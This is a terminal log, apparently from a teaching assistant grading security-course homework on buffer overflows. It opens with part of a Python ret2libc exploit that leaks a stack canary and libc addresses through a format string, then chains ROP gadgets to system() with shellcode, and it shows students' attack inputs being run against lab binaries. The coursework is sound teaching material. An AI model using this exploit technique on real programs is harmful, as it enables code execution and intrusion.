#(o, e) = popen.communicate("%llx-" * 71 + "\n")
#print(o,e)
# output = popen.read()
# print output
# (op, err) = popen.communicate()
# print(op, err)

# time.sleep(1)

oarr = op.split('-')

canary = int(oarr[70], 16)		# 0x65a91a774486a800 # 71th value
libcbase = int(oarr[1], 16) - 0x3c6790	# 0x7ffff7dd3790 - 0x3c6790 # 2nd value
bufaddr = int(oarr[63], 16) - 0x510	# 0x7ffff7dd3780 - 0x510 # 64th value

ebp = bufaddr + 0x430			# we will overwrite the %rbp value on the stack as well
mprotect = libcbase + 0x101770		# mprotect offset in libc
system = libcbase + 0x45390		# system offset in libc
gadget1 = libcbase + 135427 - 1		# pop %rdi; ret;
gadget2 = libcbase + 131817 - 1		# pop %rsi; ret;
gadget3 = libcbase + 7059 - 1		# pop %rdx; ret;

aligned_bufaddr = bufaddr & 0xfffffffffffff000; # align to page boundary
size = 4096					# page size
prot = 0x1|0x2|0x4;				# RWX

padding = "\x90" * (1024-len(shellcode))	# nop padding of remaining buf

print hex(system)

payload = shellcode + padding + \
   struct.pack('Q', canary) + \
   struct.pack('Q', ebp) + \
   struct.pack('Q', gadget1) + \
   struct.pack('Q', bufaddr) + \
   struct.pack('Q', system)

#   struct.pack('Q', aligned_bufaddr) + \
#   struct.pack('Q', gadget2) + \
#   struct.pack('Q', size) + \
#   struct.pack('Q', gadget3) + \
#   struct.pack('Q', prot) + \
#   struct.pack('Q', mprotect) + \
#   struct.pack('Q', bufaddr)

print " -- Sending Payload -- "
popen.stdin.write(payload)
(o, e) = popen.communicate()
print(o, e)

popen.wait()

ryadav3@nemo:~/576/labs/lab8/test$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:hw2-ret2libc Lunarantic$ cd ..
Lunarantic:576 Lunarantic$ ls
2018-10-24T2135_Grades-Systems_Security.csv	hw2-more_attacks.tar.gz
assign1						hw2-ret2libc
assign2.tar.gz					hw2-ret2libc-mod.tar.gz
gdb-sleep					hw2-ret2libc.tar.gz
hw1-stack_smashing				hw2.tar.gz
hw1-stack_smashing.pdf				lab4
hw1-stack_smashing.tar.gz			stack_and_leak
hw2						stack_and_leak.tar.gz
hw2-more_attacks				submissions-hw2.zip
hw2-more_attacks-new.tar.gz			testtar
hw2-more_attacks-old.tar.gz
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu

^C
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

38 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Sat Oct 27 01:05:54 2018 from 155.246.82.145
ryadav3@nemo:~$ ls
576  615  cs_html  tmp
ryadav3@nemo:~$ cd 576/
assigns/   cs576-s18/ labs/      old/       pin/       
ryadav3@nemo:~$ cd 576/assigns/
ryadav3@nemo:~/576/assigns$ unzip
UnZip 6.00 of 20 April 2009, by Debian. Original by Info-ZIP.

Usage: unzip [-Z] [-opts[modifiers]] file[.zip] [list] [-x xlist] [-d exdir]
  Default action is to extract files in list, except those in xlist, to exdir;
  file[.zip] may be a wildcard.  -Z => ZipInfo mode ("unzip -Z" for usage).

  -p  extract files to pipe, no messages     -l  list files (short format)
  -f  freshen existing files, create none    -t  test compressed archive data
  -u  update files, create if necessary      -z  display archive comment only
  -v  list verbosely/show version info       -T  timestamp archive to latest
  -x  exclude files that follow (in xlist)   -d  extract files into exdir
modifiers:
  -n  never overwrite existing files         -q  quiet mode (-qq => quieter)
  -o  overwrite files WITHOUT prompting      -a  auto-convert any text files
  -j  junk paths (do not make directories)   -aa treat ALL files as text
  -U  use escapes for all non-ASCII Unicode  -UU ignore any Unicode fields
  -C  match filenames case-insensitively     -L  make (some) names lowercase
  -X  restore UID/GID info                   -V  retain VMS version numbers
  -K  keep setuid/setgid/tacky permissions   -M  pipe through "more" pager
  -O CHARSET  specify a character encoding for DOS, Windows and OS/2 archives
  -I CHARSET  specify a character encoding for UNIX and other archives

See "unzip -hh" or unzip.txt for more help.  Examples:
  unzip data1 -x joe   => extract all files except joe from zipfile data1.zip
  unzip -p foo | more  => send contents of foo.zip via pipe into program more
  unzip -fo foo ReadMe => quietly replace existing ReadMe if archive file newer
ryadav3@nemo:~/576/assigns$ quit
No command 'quit' found, did you mean:
 Command 'luit' from package 'x11-utils' (main)
 Command 'quiz' from package 'bsdgames' (universe)
 Command 'quot' from package 'quota' (main)
 Command 'quilt' from package 'quilt' (universe)
 Command 'qgit' from package 'qgit' (universe)
quit: command not found
ryadav3@nemo:~/576/assigns$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:576 Lunarantic$ scp submissions-hw2.zip ryadav3@nemo.srcit.stevens-tech.edu:/home/ryadav3/576/assigns
ryadav3@nemo.srcit.stevens-tech.edu's password: 
submissions-hw2.zip                                                                  100%  552KB   1.5MB/s   00:00    
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

38 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Tue Oct 30 12:52:18 2018 from 155.246.82.178
ryadav3@nemo:~$ cd 576/assigns/
ryadav3@nemo:~/576/assigns$ ls
assign2  assign2.tar.gz  assignment1  hw1-stack_smashing  hw1-stack_smashing.tar.gz  hw2  submissions-hw2.zip
ryadav3@nemo:~/576/assigns$ unzip submissions-hw2.zip 
Archive:  submissions-hw2.zip
  inflating: hw21_15396_4242727_HW2.tgz  
  inflating: hw211_late_19293_4247736_hw2.tgz  
  inflating: hw24_19609_4243898_submission.tgz  
  inflating: hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz  
  inflating: hw23_19692_4238469_barish_pyle_hw2.tgz  
  inflating: hw26_late_24124_4248207_ajin_elew_hw2-3.tgz  
  inflating: hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz  
  inflating: hw25_late_24270_4248172_hw2.tgz  
  inflating: hw210_late_24408_4247739_ddelaussnajderhw2.tgz  
  inflating: hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz  
  inflating: hw29_32605_4244627_hw2submission.tgz  
ryadav3@nemo:~/576/assigns$ ls
assign2                                         hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz
assign2.tar.gz                                  hw23_19692_4238469_barish_pyle_hw2.tgz
assignment1                                     hw24_19609_4243898_submission.tgz
hw1-stack_smashing                              hw25_late_24270_4248172_hw2.tgz
hw1-stack_smashing.tar.gz                       hw26_late_24124_4248207_ajin_elew_hw2-3.tgz
hw2                                             hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz
hw210_late_24408_4247739_ddelaussnajderhw2.tgz  hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz
hw21_15396_4242727_HW2.tgz                      hw29_32605_4244627_hw2submission.tgz
hw211_late_19293_4247736_hw2.tgz                submissions-hw2.zip
ryadav3@nemo:~/576/assigns$ mkdir assignment2/
ryadav3@nemo:~/576/assigns$ mv hw2*.tgz assignment2/
ryadav3@nemo:~/576/assigns$ ls
assign2         assignment1  hw1-stack_smashing         hw2
assign2.tar.gz  assignment2  hw1-stack_smashing.tar.gz  submissions-hw2.zip
ryadav3@nemo:~/576/assigns$ mv submissions-hw2.zip assignment2/
ryadav3@nemo:~/576/assigns$ cd assignment2/
ryadav3@nemo:~/576/assigns/assignment2$ ls
hw210_late_24408_4247739_ddelaussnajderhw2.tgz
hw21_15396_4242727_HW2.tgz
hw211_late_19293_4247736_hw2.tgz
hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz
hw23_19692_4238469_barish_pyle_hw2.tgz
hw24_19609_4243898_submission.tgz
hw25_late_24270_4248172_hw2.tgz
hw26_late_24124_4248207_ajin_elew_hw2-3.tgz
hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz
hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz
hw29_32605_4244627_hw2submission.tgz
submissions-hw2.zip
ryadav3@nemo:~/576/assigns/assignment2$ tar -zxvf hw21_15396_4242727_HW2.tgz 
hw2-more_attacks/
hw2-more_attacks/vuln_prog3.c
hw2-more_attacks/vuln_prog2.c
hw2-more_attacks/vuln_prog1.bin
hw2-more_attacks/task1.txt
hw2-more_attacks/vuln_prog1.c
hw2-more_attacks/malicious_input1.txt
hw2-more_attacks/malicious_input1.py
hw2-more_attacks/vuln_prog2.bin
hw2-more_attacks/task5.txt
hw2-more_attacks/malicious_input2.txt
hw2-more_attacks/malicious_input5.txt
hw2-more_attacks/task2.txt
hw2-more_attacks/malicious_input2.py
hw2-more_attacks/vuln_prog4.c
hw2-more_attacks/malicious_input3.py
hw2-more_attacks/malicious_input4.txt
hw2-more_attacks/task3.txt
hw2-more_attacks/task4.txt
hw2-more_attacks/malicious_input3.txt
hw2-more_attacks/vuln_prog4.bin
hw2-more_attacks/vuln_prog3.bin
hw2-more_attacks/malicious_input4.py
hw2-more_attacks/malicious_input5.py
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team1
ryadav3@nemo:~/576/assigns/assignment2$ mv hw21_15396_4242727_HW2.tgz hw2-more_attacks/ team1
ryadav3@nemo:~/576/assigns/assignment2$ cd team1/
ryadav3@nemo:~/576/assigns/assignment2/team1$ ls
hw21_15396_4242727_HW2.tgz  hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team1$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ ls
malicious_input1.py   malicious_input3.py   malicious_input5.py   task3.txt       vuln_prog1.c    vuln_prog3.c
malicious_input1.txt  malicious_input3.txt  malicious_input5.txt  task4.txt       vuln_prog2.bin  vuln_prog4.bin
malicious_input2.py   malicious_input4.py   task1.txt             task5.txt       vuln_prog2.c    vuln_prog4.c
malicious_input2.txt  malicious_input4.txt  task2.txt             vuln_prog1.bin  vuln_prog3.bin
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ ./vulnprog1.bin 10399956 < malicious_input1.txt
-bash: ./vulnprog1.bin: No such file or directory
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ ./vuln_prog1.bin 10399956 < malicious_input1.txt
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAA?`
Stack at 0x7ffc60a10b70

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ cd ../..
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team2
ryadav3@nemo:~/576/assigns/assignment2$ mv hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz team2/
ryadav3@nemo:~/576/assigns/assignment2$ cd team
-bash: cd: team: No such file or directory
ryadav3@nemo:~/576/assigns/assignment2$ cd team2/
ryadav3@nemo:~/576/assigns/assignment2/team2$ tar -tzvf hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz 
drwxr-xr-x minty/minty       0 2018-10-28 20:40 answers/
drwxr-xr-x minty/minty       0 2018-10-28 18:37 answers/task4/
-rw-r--r-- minty/minty      18 2018-10-27 16:35 answers/task4/malicious_input4.txt
-rw-rw-r-- minty/minty    1296 2018-10-28 19:08 answers/task4/task4.txt
-rw-r--r-- minty/minty      24 2018-10-27 16:42 answers/task4/malicious_input4.py
drwxr-xr-x minty/minty       0 2018-10-29 03:47 answers/task5/
-rw-r--r-- minty/minty      24 2018-10-29 03:45 answers/task5/malicious_input5.txt
-rw-r--r-- minty/minty     137 2018-10-29 03:44 answers/task5/malicious_input5.py
-rw-r--r-- minty/minty    7868 2018-10-29 03:46 answers/task5/task5.txt
-rw-r--r-- minty/minty      95 2018-10-23 08:29 answers/Rachel_Stern_AND_Min_Su_Park
drwxr-xr-x minty/minty       0 2018-10-28 17:50 answers/task2/
-rw-rw-r-- minty/minty    4449 2018-10-28 18:36 answers/task2/task2.txt
-rw-r--r-- minty/minty     151 2018-10-25 14:50 answers/task2/malicious_input2.py
-rw-r--r-- minty/minty      84 2018-10-25 17:54 answers/task2/malicious_input2.txt
drwxr-xr-x minty/minty       0 2018-10-28 17:50 answers/task1/
-rw-r--r-- minty/minty      40 2018-10-23 08:27 answers/task1/malicious_input1.txt
-rw-r--r-- minty/minty     136 2018-10-23 08:26 answers/task1/malicious_input1.py
-rw-r--r-- minty/minty    4882 2018-10-23 09:57 answers/task1/task1.txt
drwxr-xr-x minty/minty       0 2018-10-28 20:16 answers/task3/
-rw-rw-r-- minty/minty    7742 2018-10-28 20:19 answers/task3/task3.txt
-rw-r--r-- minty/minty     280 2018-10-28 20:05 answers/task3/malicious_input3.txt
-rw-r--r-- minty/minty     181 2018-10-28 20:06 answers/task3/malicious_input3.py
ryadav3@nemo:~/576/assigns/assignment2/team2$ cd a
-bash: cd: a: No such file or directory
ryadav3@nemo:~/576/assigns/assignment2/team2$ ls
hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz
ryadav3@nemo:~/576/assigns/assignment2/team2$ tar -xzvf hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz 
answers/
answers/task4/
answers/task4/malicious_input4.txt
answers/task4/task4.txt
answers/task4/malicious_input4.py
answers/task5/
answers/task5/malicious_input5.txt
answers/task5/malicious_input5.py
answers/task5/task5.txt
answers/Rachel_Stern_AND_Min_Su_Park
answers/task2/
answers/task2/task2.txt
answers/task2/malicious_input2.py
answers/task2/malicious_input2.txt
answers/task1/
answers/task1/malicious_input1.txt
answers/task1/malicious_input1.py
answers/task1/task1.txt
answers/task3/
answers/task3/task3.txt
answers/task3/malicious_input3.txt
answers/task3/malicious_input3.py
ryadav3@nemo:~/576/assigns/assignment2/team2$ cd answers/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers$ ls
Rachel_Stern_AND_Min_Su_Park  task1  task2  task3  task4  task5
ryadav3@nemo:~/576/assigns/assignment2/team2/answers$ cd task1/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ls
malicious_input1.py  malicious_input1.txt  task1.txt
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ../../../team1/hw2-more_attacks/vuln_prog1.bin 
Missing arguments
Usage: ../../../team1/hw2-more_attacks/vuln_prog1.bin <student_id>
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ls ..
Rachel_Stern_AND_Min_Su_Park  task1  task2  task3  task4  task5
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ cat ../Rachel_Stern_AND_Min_Su_Park 
I pledge my honor that I have abided by the Stevens Honor System.

- Rachel Stern
- Min Su Parkryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ../../../team1/hw2-more_attacks/vuln_prog1.bin 123 < malicious_input1.
-bash: malicious_input1.: No such file or directory
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ../../../team1/hw2-more_attacks/vuln_prog1.bin 123 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAA?`
Stack at 0x7ffd7d6a9cb0

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ../../../team1/hw2-more_attacks/vuln_prog1.bin 10399956 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAA?`
Stack at 0x7fff0d976890

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ cd ../../..
ryadav3@nemo:~/576/assigns/assignment2$ ls
hw210_late_24408_4247739_ddelaussnajderhw2.tgz  hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz
hw211_late_19293_4247736_hw2.tgz                hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz
hw23_19692_4238469_barish_pyle_hw2.tgz          hw29_32605_4244627_hw2submission.tgz
hw24_19609_4243898_submission.tgz               submissions-hw2.zip
hw25_late_24270_4248172_hw2.tgz                 team1
hw26_late_24124_4248207_ajin_elew_hw2-3.tgz     team2
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team3
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team4
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team5
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team6
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team7
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team8
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team9
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team10
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team11
ryadav3@nemo:~/576/assigns/assignment2$ mkdir team12
ryadav3@nemo:~/576/assigns/assignment2$ mv hw23_19692_4238469_barish_pyle_hw2.tgz team3/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw24_19609_4243898_submission.tgz team4/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw25_late_24270_4248172_hw2.tgz team5/
ryadav3@nemo:~/576/assigns/assignment2$ df -h
Filesystem                                          Size  Used Avail Use% Mounted on
udev                                                980M     0  980M   0% /dev
tmpfs                                               201M   22M  179M  11% /run
/dev/mapper/nemo--vg-root                            18G  5.9G   11G  36% /
tmpfs                                              1001M     0 1001M   0% /dev/shm
tmpfs                                               5.0M     0  5.0M   0% /run/lock
tmpfs                                              1001M     0 1001M   0% /sys/fs/cgroup
/dev/vda1                                           472M  260M  188M  59% /boot
vader.srcit.stevens-tech.edu:/export/home/hzheng12  1.0G   64K  1.0G   1% /home/hzheng12
tmpfs                                               201M     0  201M   0% /run/user/13119
tmpfs                                               201M     0  201M   0% /run/user/12741
vader.srcit.stevens-tech.edu:/export/home/bbrusber  1.0G   31M  994M   3% /home/bbrusber
tmpfs                                               201M     0  201M   0% /run/user/13132
tmpfs                                               201M     0  201M   0% /run/user/12928
vader.srcit.stevens-tech.edu:/export/home/asamarka  1.0G  1.6M 1023M   1% /home/asamarka
tmpfs                                               201M     0  201M   0% /run/user/12982
vader.srcit.stevens-tech.edu:/export/home/jvalenzu  1.0G  1.1M 1023M   1% /home/jvalenzu
tmpfs                                               201M     0  201M   0% /run/user/13112
vader.srcit.stevens-tech.edu:/export/home/ryadav3  1023M  496M  528M  49% /home/ryadav3
tmpfs                                               201M     0  201M   0% /run/user/12903
ryadav3@nemo:~/576/assigns/assignment2$ mv hw26_late_24124_4248207_ajin_elew_hw2-3.tgz team6/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw27_late_24135_4247996_tmitche2_tkautzma_hw2.tgz team7/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw28_27578_4244730_moissinac_sharma_hw2-more_attacks.tgz team8/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw29_32605_4244627_hw2submission.tgz team9/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw210_late_24408_4247739_ddelaussnajderhw2.tgz team10/
ryadav3@nemo:~/576/assigns/assignment2$ mv hw211_late_19293_4247736_hw2.tgz team11/
ryadav3@nemo:~/576/assigns/assignment2$ ls
submissions-hw2.zip  team1  team10  team11  team12  team2  team3  team4  team5  team6  team7  team8  team9
ryadav3@nemo:~/576/assigns/assignment2$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

38 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Tue Oct 30 12:53:30 2018 from 155.246.82.178
ryadav3@nemo:~$ cd 576/assigns/assignment2/team2/
ryadav3@nemo:~/576/assigns/assignment2/team2$ cd answers/task1/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ ../../../team1/hw2-more_attacks/vuln_prog1.bin 10408042 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAA?`
Stack at 0x7ffc8d702f50

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ cd ../../../team3/
ryadav3@nemo:~/576/assigns/assignment2/team3$ ls
hw23_19692_4238469_barish_pyle_hw2.tgz
ryadav3@nemo:~/576/assigns/assignment2/team3$ tar -zxvf hw23_19692_4238469_barish_pyle_hw2.tgz 
hw2-more_attacks/
hw2-more_attacks/vuln_prog2.bin
hw2-more_attacks/vuln_prog3.c
hw2-more_attacks/malicious_input5.txt
hw2-more_attacks/malicious_input2.txt
hw2-more_attacks/task1.txt
hw2-more_attacks/vuln_prog2.c
hw2-more_attacks/malicious_input3.txt
hw2-more_attacks/malicious_input4.txt
hw2-more_attacks/vuln_prog4.bin
hw2-more_attacks/vuln_prog3.bin
hw2-more_attacks/vuln_prog1.c
hw2-more_attacks/malicious_input2.py
hw2-more_attacks/malicious_input3.py
hw2-more_attacks/malicious_input1.py
hw2-more_attacks/task4.txt
hw2-more_attacks/task3.txt
hw2-more_attacks/vuln_prog4.c
hw2-more_attacks/malicious_input4.py
hw2-more_attacks/malicious_input5.py
hw2-more_attacks/.malicious_input2.py.swp
hw2-more_attacks/vuln_prog1.bin
hw2-more_attacks/malicious_input1.txt
hw2-more_attacks/task2.txt
hw2-more_attacks/task5.txt
ryadav3@nemo:~/576/assigns/assignment2/team3$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ ls
malicious_input1.py   malicious_input3.py   malicious_input5.py   task3.txt       vuln_prog1.c    vuln_prog3.c
malicious_input1.txt  malicious_input3.txt  malicious_input5.txt  task4.txt       vuln_prog2.bin  vuln_prog4.bin
malicious_input2.py   malicious_input4.py   task1.txt             task5.txt       vuln_prog2.c    vuln_prog4.c
malicious_input2.txt  malicious_input4.txt  task2.txt             vuln_prog1.bin  vuln_prog3.bin
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ ls -la
total 14
drwx------+ 2 ryadav3 student    26 Oct 25 16:50 .
drwxr-xr-x+ 3 ryadav3 student     4 Oct 30 15:45 ..
-rw-r--r--+ 1 ryadav3 student    64 Oct 22 17:24 malicious_input1.py
-rw-r--r--+ 1 ryadav3 student    41 Oct 25 16:40 malicious_input1.txt
-rw-r--r--+ 1 ryadav3 student    86 Oct 23 13:06 malicious_input2.py
-rw-r--r--+ 1 ryadav3 student 12288 Oct 23 15:13 .malicious_input2.py.swp
-rw-r--r--+ 1 ryadav3 student   181 Oct 25 16:41 malicious_input2.txt
-rw-r--r--+ 1 ryadav3 student   492 Oct 23 19:27 malicious_input3.py
-rw-r--r--+ 1 ryadav3 student   292 Oct 25 16:41 malicious_input3.txt
-rw-r--r--+ 1 ryadav3 student    52 Oct 25 15:31 malicious_input4.py
-rw-r--r--+ 1 ryadav3 student    25 Oct 25 16:41 malicious_input4.txt
-rw-r--r--+ 1 ryadav3 student    66 Oct 25 16:15 malicious_input5.py
-rw-r--r--+ 1 ryadav3 student    28 Oct 25 16:41 malicious_input5.txt
-rw-r--r--+ 1 ryadav3 student  1446 Oct 25 16:48 task1.txt
-rw-r--r--+ 1 ryadav3 student   795 Oct 25 16:50 task2.txt
-rw-r--r--+ 1 ryadav3 student   663 Oct 25 16:50 task3.txt
-rw-r--r--+ 1 ryadav3 student   320 Oct 25 16:50 task4.txt
-rw-r--r--+ 1 ryadav3 student   682 Oct 25 16:50 task5.txt
-rwxr-xr-x+ 1 ryadav3 student  9160 Oct 12 23:32 vuln_prog1.bin
-rw-------+ 1 ryadav3 student   861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x+ 1 ryadav3 student  9088 Oct 13 00:24 vuln_prog2.bin
-rw-------+ 1 ryadav3 student   813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x+ 1 ryadav3 student  7492 Oct 13 01:16 vuln_prog3.bin
-rw-------+ 1 ryadav3 student   345 Oct 16 13:40 vuln_prog3.c
-rwx------+ 1 ryadav3 student  8904 Oct 16 13:40 vuln_prog4.bin
-rw-------+ 1 ryadav3 student   449 Oct 16 13:40 vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ ./vuln_prog1.bin 10408551 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA
Stack at 0x7ffd7fb28be0

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ cd ../../team1/hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ cd ../../team4/
ryadav3@nemo:~/576/assigns/assignment2/team4$ ls
hw24_19609_4243898_submission.tgz
ryadav3@nemo:~/576/assigns/assignment2/team4$ tar -zxvf hw24_19609_4243898_submission.tgz 
ID.txt
malicious_input1.sh
malicious_input1.txt
malicious_input2.sh
malicious_input2.txt
malicious_input3.sh
malicious_input3.txt
malicious_input4.sh
malicious_input4.txt
malicious_input5.sh
malicious_input5.txt
task1.txt
task2.txt
task3.txt
task4.txt
task5.txt
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team4$ ./../team3/hw2-more_attacks/vuln_prog1.bin 702695 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAA?`
Stack at 0x7ffd038f86e0

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim malicious_input1.sh 
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team4$ 
ryadav3@nemo:~/576/assigns/assignment2/team4$ cd ..
ryadav3@nemo:~/576/assigns/assignment2$ cd team5/
ryadav3@nemo:~/576/assigns/assignment2/team5$ tar -xzvf hw25_late_24270_4248172_hw2.tgz 
hw2-more_attacks/
hw2-more_attacks/malicious_input4.py
hw2-more_attacks/vuln_prog3.bin
hw2-more_attacks/vuln_prog4.bin
hw2-more_attacks/vuln_prog4.c
hw2-more_attacks/task1.txt
hw2-more_attacks/vuln_prog2.bin
hw2-more_attacks/malicious_input2.py
hw2-more_attacks/malicious_input3.py
hw2-more_attacks/malicious_input1.py
hw2-more_attacks/malicious_input1.txt
hw2-more_attacks/malicious_input2.txt
hw2-more_attacks/task4.txt
hw2-more_attacks/task3.txt
hw2-more_attacks/vuln_prog3.c
hw2-more_attacks/vuln_prog1.bin
hw2-more_attacks/vuln_prog2.c
hw2-more_attacks/task2.txt
hw2-more_attacks/malicious_input3.txt
hw2-more_attacks/malicious_input4.txt
hw2-more_attacks/vuln_prog1.c
ryadav3@nemo:~/576/assigns/assignment2/team5$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1.py   malicious_input3.py   task1.txt  vuln_prog1.bin  vuln_prog3.bin
malicious_input1.txt  malicious_input3.txt  task2.txt  vuln_prog1.c    vuln_prog3.c
malicious_input2.py   malicious_input4.py   task3.txt  vuln_prog2.bin  vuln_prog4.bin
malicious_input2.txt  malicious_input4.txt  task4.txt  vuln_prog2.c    vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ./vuln_prog1.bin 123 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
